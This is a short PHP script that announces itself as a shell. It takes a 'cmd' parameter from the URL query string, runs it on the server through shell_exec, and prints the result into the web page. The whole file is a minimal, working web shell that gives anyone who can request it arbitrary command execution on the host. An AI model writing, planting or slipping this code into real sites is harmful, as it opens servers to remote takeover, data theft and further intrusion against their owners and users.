<?php
  echo "hey I'm a shell";
  $cmd = $_GET['cmd'];
  $output = shell_exec($cmd);
  echo "<p>$output</p>";
?>
